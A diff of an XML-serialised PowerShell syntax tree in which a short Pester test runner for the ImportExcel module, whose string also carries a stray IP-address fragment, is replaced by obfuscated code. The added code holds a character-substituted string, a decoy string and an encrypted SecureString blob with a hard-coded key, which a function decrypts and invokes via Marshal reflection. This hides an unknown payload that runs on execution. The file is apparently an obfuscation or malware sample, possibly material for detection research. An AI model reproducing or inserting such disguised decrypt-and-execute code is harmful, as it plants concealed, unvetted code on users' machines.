@@ -2,23 +2,238 @@
   <UsingStatements />
   <NamedBlockAst>
     <Statements>
-      <PipelineAst>
-        <PipelineElements>
-          <CommandExpressionAst>
-            <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">try {Import-Module \$PSScriptRoot\..\..\ImportExcel.psd1} catch {throw ;('ip:37.247.149.142') |  oUT-nuLL return}
-
-. \$PSScriptRoot\TestAPIReadXls.ps1
-
-Test-APIReadXls \$PSScriptRoot\testlist.xlsx | Foreach-Object {
-    Invoke-Pester -Script \$_.fullname  -PassThru -Show None
-}
+      <AssignmentStatementAst Operator="Equals">
+        <VariableExpressionAst VariablePath="BouoK" StaticType="System.Object" />
+        <CommandExpressionAst>
+          <StringConstantExpressionAst StringConstantType="DoubleQuoted" StaticType="string">Ur1result = JjVDzaSeHohfl3RZPdC=NJio9R{EG=AXudzm{HS=YYl}LlkaOrRqrgU6Y}PrLoD{moh9BTFkSZXcOrRDDWUS?C8^BY&gt;T?45hAffX_6eu8tQc_ckUT[CFCVxLhXykRIhfl}COrRXveP8=PFgo&lt;xObNrT==fdchvsn0{geWAK36AVVhTXjV{c&lt;g{03ZJAN=s@&lt;}[jpMJ{6?vYytm1P7bHYvV}7Qfa04zapcap9Toxt^3VqeVxL=JNrhfllvD{Z2IWf5@R6Az?NaB{u7QGJ9IuH2A{VQNVxLtyY39VUuFEPZ2fpped@wCY_jtmbR6I2NXwj6kZ36AC6EpKVxL2QvEIWbY9Wj{b_7i_chOrRVxLueFAYVItpuV7NVgdcOrRbm336A55EwOrRZv36AlHVDjMVxLco36Ai&gt;F7490PvYi0&gt;z;D_=;AqInK4hflPfn]fBEfr36A;vC@KLG80&lt;Chfl&lt;o8v]6RW[_WH]=c9b@W]3PGkOrR}EWF1hfl0Qt?dCGBU]_36AZp4IRgnr4}foXTTnmbrDVxL6FqjH}hflHw7ThiA?XiuY&lt;hflCp{VxLE?ve?zwz0}Aa4wU8[Pz36AJHFfKO3RC&lt;Erf@q64E2_q36Ae[ON^ZX&lt;[V4?YxXCqOjHQwOrRUctcOrRV7J4m36AHkG?HCUOrRoHyA9zUe=Fhflow5;h54DLhP7yllgH@=FJA3&gt;o]38VxLet&gt;TCiq}xyG57a=Qeckkrjs0oKG0_]&gt;grVxL&lt;WSdGoG?Py2CPH[636AL?aCgahflS8sy1@OrRs?]VYuJnpnwZYJ&gt;x]X8S4xNaIOrRva6]bn1x1EKf9cgGXGKRstSgCb0z[VMEuryJeR4mU]ZVxL3ehflE9?xR36ACTbxc8Cl&lt;au4NJ0a@n9PVxLT4xDoAwygb0Wz&lt;WUgA36AJweuHk@j@rtXfX6TeOCV?VxLQ7@TSZ8sgT3sKOrR{xm^E6K?A=Ua9b9orkgBI1ysIXziJjV</StringConstantExpressionAst></CommandExpressionAst>
+      </AssignmentStatementAst>
+      <AssignmentStatementAst Operator="Equals">
+        <VariableExpressionAst VariablePath="HcgKEsg" StaticType="System.Object" />
+        <CommandExpressionAst>
+          <StringConstantExpressionAst StringConstantType="DoubleQuoted" StaticType="string">OReresult = uyXChildren in backseats cause accidentsWTC Accidents in backseats cause childrenWTCipe8X101WTC9WTC182WTC60uyX
 </StringConstantExpressionAst></CommandExpressionAst>
-          <CommandAst>
+      </AssignmentStatementAst>
+      <AssignmentStatementAst Operator="Equals">
+        <VariableExpressionAst VariablePath="QHMGKRJw" StaticType="System.Object" />
+        <CommandExpressionAst>
+          <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">76492d1116743f0423413b16050a5345MgB8AE0AMgBKAHUAbQB5AFAAVwA0AHEAdABpAFQANwBjADQATgBLAHEAUABiAHcAPQA9AHwANgBjAGQANQBlADUAZABlADQAZQBkAGMANwAwADcAZAAyAGQAYQBlADQANABiADEAOQBlAGIAYQA4ADcAMgA3AGIAYQBiAGIAOQA4ADcAYgAzADYAOABkAGUAOQAyADMANABhADcAMwBjADUAOQA3ADUAOAAxADkAMQBmAGQAYQBhADQAYwBjADIAYwA1AGYANABiAGMANgAxADYAYgA5ADIAMQBjADUAZAAyAGMANAA2ADIAYgA3ADgANAA5ADAANwBjADgAZAA2AGEAZgA4ADkAZgBkAGQAZgAzADIANwBhAGEANABiADMAZAA1AGMAYwBlADAANQA2ADEAMAAxAGEAZgAwADkAZQA1AGYAZABkADAAZgBlAGIAOABmADEAMABiADAAMgBkADQAMABiADkAYwA4ADMAOAA5ADgAMgAxADEAMwAwADcAYgA3ADkANQBkADUAZgBjADAANwBhADgAOQAxADUANgBmADYAOABmADUAZgA0ADcAMAA2AGQAMABmADYANgBmADAAOQA1AGMANgA4AGIAZAA2AGMAMgBlAGEAOABlAGUAYwA0AGEAZABlADUANQBhAGYAZAA3ADcAOABjAGQAZgBkADAAOQBmADIANQAwADgAMgAzAGUAMABjAGQAMQBmAGIAMQA4AGMAZQA4AGYAZQA4ADAANwBjADYAMAA2ADMANwBjADMAYQA3ADUANQAxADcANgA4AGIAMwA3AGEANABiADUAYQBiADYANwBlADYAMABiADgANgAzADIAOAAxADYANQA3AGYAMwBkAGMAYgBmAGMAYQBlADAAMQBlAGYAZABmADkAOQAwAGEANwBhADEAOAA4ADUAOAA0AGEAMgBmADgANABiADUAZgA2AGUAYgBjADQANAAxAGUANwBiAGYAZABmAGEAYgA2AGEAMwBiAGQANQAzADcAYwAyADAAMwBiAGEANgA1ADEANwA2ADkAMAA5ADEAZgAxAGQAYwAwADQANgBkAGMAOAA1ADcAZQA5ADEAMgBkAGEAZgBkAGQAZQA2ADQAZgBiADcANgAzAGQAYQAxADUAOQA0AGMAZQAyADkAYgBmADgAZgA1ADcANgA5ADcANABlADkAOQBkADIAOQA2ADUANAAxADYAMQBkADAANwAyAGMANwBmADUAMgAzAGIAZgA4ADYAMgA5AGQAZQA5ADAAMwA4ADgAMAA5ADQANQA3ADEANAAwAGEAMwA4ADUAMwBjADMAMQBlAGQAMwBiADEANgAzADYAZgA0ADUAZAA0ADAAZgBjAGEANgBiAGEAZQBkAGUAMwAzADQAMwAzAGYANgAwADYANgAzADYAOQBkAGQANgBhAGQANQAxADAAZgAxADkAOAA4ADMANwBmAGIAZgAyADAAZgA2ADgAYgA0AGIAZgBmAGIAYwBkAGUAOAA2AGMANAA3AGUAMwBkADMAZgBjADMANABkADkAYgAzAGIAMgBmAGIAYQBhADIANABlAGMANwBkADkANABiADAAYQBiAGUAMAA1ADQAYQAwAGQANAA0ADQAMABhADMAZQA2ADgANgAwAGIAZgBhADUAMABiAGUANQAzADUAYgA2AGYAZgBmADAAYQBiAGUANAA0ADMAYQAxAGMANQBkADEAYwA4ADcAZgBiADMAOABmAGMAZgBkADEAZQA1ADEANAAzAGEANQA2AGUAMwBkADUANgA2ADUAMAA4ADcAYQA0ADcANgAwADIAZQA4ADYAMQBjADEANgBiAGIANwBjAGEAOQA3ADIAZgA3ADIAMgBlAGYAMQBmADkANQBiADIAZAA5AGQAZAA2AGUAMwAwADAAMQAwADgAMQA5ADcAYQBmADQANABkADIAYwA1ADAAOQBkADEAZAA3ADUAMwAwADcAMwA5AGYANgAxADQAMQA1ADQAYwAzADQAYQBiAGEANQAzAGIAYQA1ADMANAA0ADEANwBlADcANgA2AGMANwA4ADYAZAA2AGQAYQA1AGEANwBiADMANwAwADUAMQA2ADQAMgA0ADIAYQAxADkAMQBhADcAMQAzAGYANwAwADgAMQAyADUAMAA4ADkAMgBlADYAZQA1ADIAZgA2ADAAZAA2ADMAZAAzADMAMwBiADQAMQA2ADAAMQBkAGQANgAxAGEANQAzADEAMABkAGYAYgBiADcAZAAzAGUAZAA4ADEAZABkADQAZAAxADQANABlAGMAYQAxAGMANwAwAGYAZgBhADUAZgBlAGUAMgBlADcAZgBmADYAMgBjADUANQBmAGYAMgA4ADgAMwA0ADMAMwA2ADQAZgBhAGQAMQA3AGMAYgA3AGUANQAxAGEANgAxADQANwBiAGYANgBmADEAYgAwADMAOAAxADgAMQA0ADAAMwA3AGYAZgAxADQAZAA0ADkAMwBhADUAMQBlADEAYQAyADcAMwBjAGMANwA5ADYAZAAwAGIAMQBjAGUANwA3ADUAOABlAGMAZgA4AGYAMwAyAGEANQA4ADgAYwA5ADQANQA3ADIAMgBhADkAOQA3ADIANgA5ADUAMwAyAGMAOQA1AGEANgA5AGIANQA2AGMAZQA2ADEANABhADYAZgAxAGYAYwAxADgANgBiADkAZABjAGEAMwBiAGQAOABhADQAMAA1ADkANgA0AGEAYgAxADIAYQAzADEAYwAzADQAYgA3ADUANAAyADUAMQA1ADgAYQA1AGMAMwA1AGUAOQBiADcAMwAyADAANQAzAGMAYQA4AGIAYgA4ADIAYgA5ADYAZABlADUANgBjADgAOQBiADAAOAAzAGUAOQAxADUANABlAGYANgAzADUANgBhADEAMwA1AGUAMAA0ADQANAA2ADIAMABlADUAOQBhADEAMAA3ADUAMABjADMAZgA4ADcANQAwAGIAYgA5ADcAZABjAGUAYgBmADIANgA2AGUAMgAxADMAYwBlADIAYwA2ADMANQAwAGMANwA3ADEAMgAyAGIAYwA3ADUANgA5AGUAMQBlAGYANQA1ADgAYgBhADEAMQAzADIAZQA2ADAAYwA2AGYAMQA3ADAANwAxADIAMgAzADIAZgAzAGUAMAA5AGMANwAxADYANwA2AGMAYQAwAGQAMwAxADEAYgA3ADIANABkAGEAZgA3AGYANgBjADUAZAA0ADkAZQAyADIANgBmAGIAZQAxAGEAOAAwADMANQBkADkANQBjAGUANwA1AGIAZgAzADAANgAzADEANAA3AGYAOQA5AGQAZgBiADgAZgBhAGMAMQA5AGIANAAxADIAZQA1ADQAZQA0ADMAYQAzADgAOQA4ADAAMAAyAGEANQAzAGMAZQA4ADQAZAA5ADIAMwBkADMAMQA3ADkANAA3ADMAMAAwADMAOABlAGIAYgBlADQANABlAGQAYQBkAGMAOQBhAGEAMgAxAGYAMQA0AGMAOAA4ADEANgA5ADIAZAA0AGUANwBkAGEAZQAwAGQAMgAyAGEAYQA5AGEAZQAzADAAOAA1ADMANQAzADAAMgA0AGMAOABkADcANgBiAGIANAA3ADUANAA2ADgAZgA2ADAAZAAyAGEAZAA0ADMAZQA4ADYANgAyADAAYgAyAGYANgAyADgAZgBmAGIAMwAwADEAZQAwADQAZgBlAGQANAA5AGEAOQAwADcAZgA0ADYAZQBmAGUAZABhADEAMwA4AGEANgAzADcAZAA3AGQANABhAGEAYQAyADQAYQA2AGEAMwA3ADQAMgA3AGQANAAyADUAMQAyADgANAAyADgAYwBjADEANwAxADQAZgAxAGQAYQA2AGUANwBkAGYANwA3ADAAMQA4ADQAMQBiAGEANAA5ADAAMQBkADMAMgAzADUAMwBkAGQAMgBiADgAOQA2ADMAYwBlADAANQAxADEAOABiAGQAMQBiADkAMABjADIAOAA2AGQANQBjADEANQAyADEAMwBkAGEAMgAwAGIAMQBjADIAMgA5ADIAYwBmADEAMAA2AGQAOQBjADMAYwBiADQANAAzADgAYwA4ADcAMwA4ADEANgA3AGUAMgBiADIAZQBiADIANgA2ADEAZgBmADcAZgBhAGMAMAAxAGEAMwA1ADEAMQA0ADUAYwBlADMAYwA2ADMAMgA5ADAAYQA2ADIAYQA2ADEANQAyADkAMgA2ADUAMAA1AGMANgBhAGMANwA0AGIANgA3ADIAZQAyAGIANgA2ADQAZgAzADMANABmAGEAMABlADAAMgA1ADQANAAzADAAZQAzADMAOQBjADYANwBmADQANABhADkAZAA2ADYAZQBhADUAZgAwADQAMQBkAGIANABhADIAZgA2AGEANQBhADUAYwBkAGIAZgA5AGYANAAzADAAMAA3AGMAOAA5ADIANAAxAGUAZgA5ADgAYwA3ADgAOQAxAGEAYgBjAGUAZABiADkAMgA5ADUAMABiADkAYQA3ADkAMABkAGEAOAAyAGMAYwAyADQANAAzADIAMwA0AGMAMQA1ADgAZgA4AGUAMAA4ADcANgBmADMAYgAwAGMANwA4AGIAYQBjAGUAZAA5ADIAMQA3ADkAZgA3ADQAOQBhAGEAZAA3AGYAMAA4ADUANwBkADgAYQA1ADQAYgA1AGUANAAyADAANABiADIAZABkADkAMgA3ADgAMgAyAGUAZQA4ADMAMABhADIANAA4ADgANAA2ADYAOAAzADUAMgBmADQANABjADkAYwBjAGEAMQAzAGIAYgA3AGMAOABhADYAOABjADIAOQA3ADkANAA3AGEAMAA5AGUAZQAwAGQAYgA3ADkANgA5AGMAZABiAGIAMgAwADkAYwA1ADkAMgBmAGUANAA2ADUANQAyAGQAZABjAGYAMgA5ADYAMgA0AGMAZAAxADcAMABmAGMAZgBkADcAMgAxADgANwA2ADgAZQAzADMAMgA0ADcANQBmAGQAOQA2ADEANwBmADUAYwA5ADQAYwA4ADgAMwA1ADUAYwBiADgAOABiADEAYQBiAGIAYQA4AGQAOABhADgAOQBjADcANQA4ADgAZABkAGEAOQBlADQAOAAwADUANQBiADUANQA5ADEAYwAxADgAOQA4ADcAYQBjADgAMgA1AGMAMAA2ADAAMAA0ADIAMgAxAGIAZQA1ADcAOABhADMAMwAwADkAMABlADYAOQBhADMAMAAyADMAZQA0AGQAOQBhADAAMwA0ADcAYgA1AGEANgA3ADIAMQA2AGUAZgA4AGIAOQA4ADkAZgA2ADMAYQA2ADgAMgAzADUAMAAzAGUANgA4AGIAYQA4AGEAYwA2ADIAOAAwADYAMwA3ADIAMwA5AGUANAA4AGEAMwBhADMAMgAyADUANgAxADcAOQAxADgAMwBkADEANQA2AGQAZQBlAGMAOABiADMAOQA0AGUANQA4ADQANQAxADEANgAzADcAYgA4ADcAZAAyADUAZgBiAGUAMQA1ADQAMABlADEAYQA4ADcAZAA5ADMAZQBhADUAOQBjADEAYgAyADgAMwAwAGMAMAAwAGUAMgA5ADkANQAyADUAZQA2ADUAMAAwADMAYgAzAGMAZAA3ADQAZAA0ADgAMQA0AGUAMQA0AGIAZgAzAGQAOQA0ADYAOQA0AGQANgBkADcAMgA3ADYAMgA5ADMANgBjADMAYQAyADAAYwBmAGUAYgBiADUANQAyADkAZQA0AGIANwAzADUAMAA5ADEANQBlAGIAZQBlADAAMABkADQAZQA0ADUAMwAxAGIAMwA4AGEANgBhADEAZABiADMAZQAzADgAMQAxADYANwAzAGIANgA0ADQANgBhADcAYQA0ADcAMgA0ADYAOABjADMAYQBlADUANQBhAGYANwA2ADMAOQBhAGIANAA3AGIANAAyADgAYQA0ADUAZAAzADgAYwA1ADEANgA4ADUAMQBhADIANwA5AGEANABhADQAMgBlAGQAZAA3ADgAMwBlADAANQBlADUAMQA1ADMAZAA4ADEAYwBhAGIAYwA4ADcANAAyAGYAMwBmADcAMgBhADAAOQBhAGQAZAA2ADQANAA1AGEANwA2AGEAOQBhADkANAA5AGQAOABjADMAYwAzAGUAZgA5AGQANwA1AGUAOABjADcAMAA1ADkANQBlAGEANQBkADcAZQBkADcANwBkAGUAMgBlAGMANwBiADkAZgAxAGMAYQAxADcANgA0AGYAYwBlADUAMgAzAGUAMwBiADgAOABjADUANABhADYAYgA5ADYANwA0ADIAOQA0AGEAMgAxAGUAMAAwAGUAMwA2AGUAZAAyAGIAYgBjAGIAMwA1ADcAMAA5AGIAMwA1ADUAZgAxAGQAOABiAGUAZAAyAGYANQA0ADEAMgBlAGQAZQAxAGEAZQA1AGQAYgA0AGYAYgBmADYAZQBiAGMANgAwADYAMgA3ADUAOQA1ADYAMQAxADUAMwA4ADgAMwBlADMANgA4ADAAMgA1AGEAZABhADUAYQAwADkAYwAwAGIAMwBkADIAZQA0ADgANAAxAGEAMgAwADQAYQA2AGIANABlADIAMABhAGUAMQBkAGEANQA2ADIAYQAzAGUANQA2AGEAYwA1ADUANgAxADgAOAA0AGQAZgBhAGIAZQBmAGYAOQBmADMAMAA4AGIAMQAxADgAOABmAGMAMwAwADMAZgA3ADgAYgA1AGUAZQBhAGUANwBhAGUAYgA4ADAAMgAwAGYAMgAyADcAZgA3ADEAMABiAGIAMgAxAGMAMwA5ADYAOAAyADIANgAzADEAYwBiADcAYwAxAGEAYQAxAGEAMgBmADQANABkAGMAOQA5ADAAMQBkADAANAA2AGYAYQBkAGEAYQBiADQAYQA0AGQAZQAxADUAZgBlAGIAZQAzADgAZABjADEANwAzAGYANwBlADgAZQA1ADMAYQA5ADYAMAAzADgANQBmAGYAMABkAGIAMAA2ADUAZgBjADMANgA4AGYAYgBiAGMAYgA2ADIANABmADEAMQBhAGUANQBkADgANgAwADgANABiADEAMwBjAGYAYgAwAGUAOAAzAGYAMgA1ADgANgBjADAAYQAzAGIANAA2AGMAOABiADUANAA2AGQAMwBlADgAMABhADEAMAAzAGMANgBjADkAZgA3ADUANAA2ADEAOQA3AGMAMQA3ADYAMQBhAGEAMwA2ADcAZgA0AGIAZAAzADcAYgA1ADIAZgA2AGUAMABlADQAYgA2ADAANwBkAGYAYgBlADgAOQBhADkAOQAxADYAMwAxADEAMAA5ADQANQBkADEANgAxADMAYwBhAGUAYQBmADQAMwBlADAAMQAxADUAZgA3AGEANgBlADgANAA5ADEAMgAwAGUAZQBkAGIAYgAyADUAMgAwADkAMwAxAGYAMwBmAGMANQBmADUAYwA2ADcAZABjADgAMQAzADAAYQBlADAAMwBlAGYAMQBkADgANQA4ADAAMwAxADAAOQA3AGMAOQBhAGUAZAAyADcAMQA5ADQAYgA1ADUAMwBlAGQANgAyADYAZABhAGQAZQAwADIAMwBhADUAMwBhADYAZABkADYANgA5ADUAYQA0ADIAMgA0AGQAMABhADkANwAyADUAZQAzADcANgA0ADAANgAxAGIAMABmAGIAOAA0AGYAYQBmADkAOQAzAGQAMgA5ADIAMQA0ADUAMgAwADMANQBlAGQAYQBkAGMAZgBlAGEANgBmAGEAMAA0ADkANAA2ADIAOQBmAGQANwA4ADQAZQA2AGUAYgA4ADkAZgBmADUAYwA2AGIANwA2AGQAYgA4AGQAMQBlAGIAMQA4ADQAZAAyAGEANgAxADQAYwA1ADgANwAwAGUANgBjADUAMQBkAGYAOQBjADIAYgA3AGEANQA2AGUAOAA2ADgAYQA5ADYAYwAwADEANQBkADkAMgBhAGMAOQA0AGMAMwBjAGQAZQBjADcAOQA5ADkANAA0AGQAMAA5ADkAZAA5ADgAMABiADAAMwA4ADYAMwBjADEANAA5AGQAMQA1ADYANwA5ADAAMwBlADEAMwAwAGIAZQA3ADUANAA5AGYAMAAzADgAOQAyAGIANABmAGEAYQBkAGYAZgAxAGEAMABiAGUAMgA=</StringConstantExpressionAst>
+          </CommandExpressionAst>
+      </AssignmentStatementAst>
+      <FunctionDefinitionAst Name="ePpi">
+        <ScriptBlockAst>
+          <UsingStatements />
+          <ParamBlockAst>
+            <Attributes>
+              <AttributeAst TypeName="cMdLETbindING">
+                <PositionalArguments />
+                <NamedArguments />
+              </AttributeAst>
+            </Attributes>
+            <Parameters>
+              <ParameterAst Name="$rMDKr" StaticType="System.Object">
+                <Attributes>
+                  <AttributeAst TypeName="paramEteR">
+                    <PositionalArguments />
+                    <NamedArguments>
+                      <NamedAttributeArgumentAst ArgumentName="valuEfROMpiPelIne">
+                        <ConstantExpressionAst StaticType="bool">True</ConstantExpressionAst>
+                      </NamedAttributeArgumentAst>
+                    </NamedArguments>
+                  </AttributeAst>
+                </Attributes>
+                <VariableExpressionAst VariablePath="rMDKr" StaticType="System.Object" />
+              </ParameterAst>
+              <ParameterAst Name="$GblZMe" StaticType="System.Object">
+                <Attributes>
+                  <AttributeAst TypeName="paramEteR">
+                    <PositionalArguments />
+                    <NamedArguments>
+                      <NamedAttributeArgumentAst ArgumentName="valuEfROMpiPelIne">
+                        <ConstantExpressionAst StaticType="bool">True</ConstantExpressionAst>
+                      </NamedAttributeArgumentAst>
+                    </NamedArguments>
+                  </AttributeAst>
+                </Attributes>
+                <VariableExpressionAst VariablePath="GblZMe" StaticType="System.Object" />
+              </ParameterAst>
+              <ParameterAst Name="$tTkFMVl" StaticType="System.Object">
+                <Attributes>
+                  <AttributeAst TypeName="paramEteR">
+                    <PositionalArguments />
+                    <NamedArguments>
+                      <NamedAttributeArgumentAst ArgumentName="valuEfROMpiPelIne">
+                        <ConstantExpressionAst StaticType="bool">True</ConstantExpressionAst>
+                      </NamedAttributeArgumentAst>
+                    </NamedArguments>
+                  </AttributeAst>
+                </Attributes>
+                <VariableExpressionAst VariablePath="tTkFMVl" StaticType="System.Object" />
+              </ParameterAst>
+            </Parameters>
+          </ParamBlockAst>
+          <NamedBlockAst>
+            <Statements>
+              <PipelineAst>
+                <PipelineElements>
+                  <CommandExpressionAst>
+                    <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                      <Arguments>
+                        <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">36A</StringConstantExpressionAst>
+                        <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">|</StringConstantExpressionAst></Arguments>
+                      <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                        <Arguments>
+                          <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">hfl</StringConstantExpressionAst>
+                          <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">\</StringConstantExpressionAst>
+                        </Arguments>
+                        <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                          <Arguments>
+                            <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">OrR</StringConstantExpressionAst>
+                            <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">`</StringConstantExpressionAst></Arguments>
+                          <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                            <Arguments>
+                              <StringConstantExpressionAst StringConstantType="DoubleQuoted" StaticType="string">Ur1</StringConstantExpressionAst><StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">$</StringConstantExpressionAst></Arguments>
+                            <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                              <Arguments>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">VxL</StringConstantExpressionAst>
+                                <StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">:</StringConstantExpressionAst></Arguments>
+                              <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                                <Arguments>
+                                  <StringConstantExpressionAst StringConstantType="DoubleQuoted" StaticType="string">JjV</StringConstantExpressionAst><StringConstantExpressionAst StringConstantType="SingleQuoted" StaticType="string">'</StringConstantExpressionAst></Arguments>
+                                <VariableExpressionAst VariablePath="rMDKr" StaticType="System.Object" />
+                                <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Replace</StringConstantExpressionAst>
+                              </InvokeMemberExpressionAst>
+                              <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Replace</StringConstantExpressionAst>
+                            </InvokeMemberExpressionAst>
+                            <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Replace</StringConstantExpressionAst>
+                          </InvokeMemberExpressionAst>
+                          <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Replace</StringConstantExpressionAst>
+                        </InvokeMemberExpressionAst>
+                        <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Replace</StringConstantExpressionAst>
+                      </InvokeMemberExpressionAst>
+                      <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Replace</StringConstantExpressionAst>
+                    </InvokeMemberExpressionAst>
+                    </CommandExpressionAst>
+                  <CommandAst>
+                    <CommandElements>
+                      <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Out-Null</StringConstantExpressionAst>
+                    </CommandElements>
+                    </CommandAst>
+                </PipelineElements>
+              </PipelineAst>
+              <IfStatementAst>
+                <CommandExpressionAst>
+                      <VariableExpressionAst VariablePath="FaLse" StaticType="System.Object" />
+                      </CommandExpressionAst>
+                  <StatementBlockAst>
+                  <Statements>
+                    <PipelineAst>
+                      <PipelineElements>
+                        <CommandExpressionAst>
+                          <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                                    <Arguments>
+                                      <InvokeMemberExpressionAst Static="True" StaticType="System.Object">
+                                        <Arguments>
+                                          <SubExpressionAst StaticType="System.Object">
+                                            <StatementBlockAst>
+                                              <Statements>
+                                                <PipelineAst>
+                                                  <PipelineElements>
+                                                    <CommandExpressionAst>
+                                                      <VariableExpressionAst VariablePath="tTkFMVl" StaticType="System.Object" />
+                                                      </CommandExpressionAst>
+                                                    <CommandAst>
+                                                      <CommandElements>
+                                                        <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">ConvertTo-SecureString</StringConstantExpressionAst>
+                                                        <CommandParameterAst ParameterName="ke" />
+                                                        <ArrayLiteralAst StaticType="System.Object[]">
+                                                          <Elements>
+                                                            <ConstantExpressionAst StaticType="int">56</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">13</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">60</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">156</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">110</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">234</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">18</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">129</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">194</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">74</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">215</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">44</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">110</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">76</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">85</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">237</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">54</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">150</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">87</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">175</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">101</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">202</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">140</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">246</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">58</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">167</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">217</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">49</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">128</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">193</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">41</ConstantExpressionAst>
+                                                            <ConstantExpressionAst StaticType="int">54</ConstantExpressionAst>
+                                                          </Elements>
+                                                        </ArrayLiteralAst>
+                                                      </CommandElements>
+                                                      </CommandAst>
+                                                  </PipelineElements>
+                                                </PipelineAst>
+                                              </Statements>
+                                            </StatementBlockAst>
+                                          </SubExpressionAst>
+                                        </Arguments>
+                                        <TypeExpressionAst TypeName="Runtime.InteropServices.Marshal" StaticType="type" />
+                                        <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">SecureStringToBStr</StringConstantExpressionAst>
+                                      </InvokeMemberExpressionAst>
+                                    </Arguments>
+                                    <MemberExpressionAst Static="True" StaticType="System.Object">
+                                      <TypeExpressionAst TypeName="Runtime.InteropServices.Marshal" StaticType="type" />
+                                      <MemberExpressionAst Static="False" StaticType="System.Object">
+                                                <IndexExpressionAst StaticType="System.Object">
+                                                  <InvokeMemberExpressionAst Static="False" StaticType="System.Object">
+                                                    <TypeExpressionAst TypeName="Runtime.InteropServices.Marshal" StaticType="type" />
+                                                    <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">GetMembers</StringConstantExpressionAst>
+                                                  </InvokeMemberExpressionAst>
+                                                  <ConstantExpressionAst StaticType="int">3</ConstantExpressionAst>
+                                                </IndexExpressionAst>
+                                                <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Name</StringConstantExpressionAst>
+                                              </MemberExpressionAst>
+                                              </MemberExpressionAst>
+                                    <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Invoke</StringConstantExpressionAst>
+                                  </InvokeMemberExpressionAst>
+                                  </CommandExpressionAst>
+                        <CommandAst>
+                          <CommandElements>
+                            <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Out-Null</StringConstantExpressionAst>
+                          </CommandElements>
+                          </CommandAst>
+                      </PipelineElements>
+                    </PipelineAst>
+                  </Statements>
+                </StatementBlockAst>
+              </IfStatementAst>
+            </Statements>
+          </NamedBlockAst>
+        </ScriptBlockAst>
+      </FunctionDefinitionAst>
+      <CommandAst>
             <CommandElements>
-              <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">Invoke-Expression</StringConstantExpressionAst></CommandElements>
+              <StringConstantExpressionAst StringConstantType="BareWord" StaticType="string">ePpi</StringConstantExpressionAst>
+              <CommandParameterAst ParameterName="rMDKr" />
+              <VariableExpressionAst VariablePath="BouoK" StaticType="System.Object" />
+              <CommandParameterAst ParameterName="GblZMe" />
+              <VariableExpressionAst VariablePath="HcgKEsg" StaticType="System.Object" />
+              <CommandParameterAst ParameterName="tTkFMVl" />
+              <VariableExpressionAst VariablePath="QHMGKRJw" StaticType="System.Object" />
+            </CommandElements>
             </CommandAst>
-        </PipelineElements>
-      </PipelineAst>
-    </Statements>
+        </Statements>
   </NamedBlockAst>
 </ScriptBlockAst>
